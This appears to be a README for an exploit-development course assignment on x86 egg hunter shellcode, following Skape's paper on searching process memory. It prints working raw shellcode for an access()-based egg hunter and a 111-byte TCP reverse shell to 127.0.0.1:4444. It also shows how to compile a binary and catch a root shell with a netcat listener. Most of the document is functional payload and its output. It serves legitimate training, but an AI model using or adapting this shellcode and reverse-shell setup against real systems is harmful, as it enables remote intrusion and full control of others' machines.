# Assignment 3: Egg hunter shellcode

The egg hunter shellcode used in this assignment is based on the paper [Safely Searching Process Virtual Address Space](www.hick.org/code/skape/papers/egghunt-shellcode.pdf) by Skape.

To view the argument options for egg_hunter_x86.py:

```bash
python3 egg_hunter_x86.py -h
usage: egg_hunter_x86.py [-h] [-t {access,sigaction}] [-x {bind,reverse}] [-l LHOST]
                         [-p {0..65535}] [-s]

Generate x86 egg hunter shellcode.

optional arguments:
  -h, --help            show this help message and exit
  -t {access,sigaction}, --technique {access,sigaction}
                        Technique to use for egghunter.
  -x {bind,reverse}, --payload {bind,reverse}
                        Type of payload to execute
  -l LHOST, --lhost LHOST
                        Remote IPv4 address for TCP reverse shell to connect to.
  -p {0..65535}, --lport {0..65535}
                        Remote port for TCP reverse shell to connect to.
  -s, --shellcode       Output shellcode only
```

To generate the raw shellcode for a given payload type e.g. a reverse shell using the **access()** syscall, do the following:

```bash
python3 egg_hunter_x86.py -t access -x reverse -p 4444 -l 127.0.0.1 --shellcode

[*] Generating shellcode for x86 egg hunter using access technique
[*] Egg hunter length: 34 bytes
[*] Checking for NULL bytes...
[+] No NULL bytes detected!
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"

[*] Generating shellcode for x86 TCP reverse shell on 127.0.0.1:4444
[*] Shellcode length: 111 bytes
[*] Checking for NULL bytes...
[+] No NULL bytes detected!
"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x31\xd2\x89\xc2\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x31\xff\xbf\x80\xff\xff\xfe\x83\xf7\xff\x31\xc9\x57\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\x6a\x10\x56\x52\x89\xe1\xcd\x80\x52\xb0\x3f\x5b\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xdb\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
```

To generate a working binary with your chosen payload and technique, omit the `--shellcode` option:

```bash
python3 egg_hunter_x86.py -t access -x reverse -p 4444 -l 127.0.0.1            

[*] Compiled shellcode for x86 egg hunter
[*] Technique: access(2)
[*] Payload: reverse shell
[*] Test by starting a listener with nc -nlvp 4444 and executing ./egg_hunter_reverse_x86
```

The payload can then be tested as indicated in the printed output:

```bash
./egg_hunter_reverse_x86
```

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 34636
hostname
kali
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

---
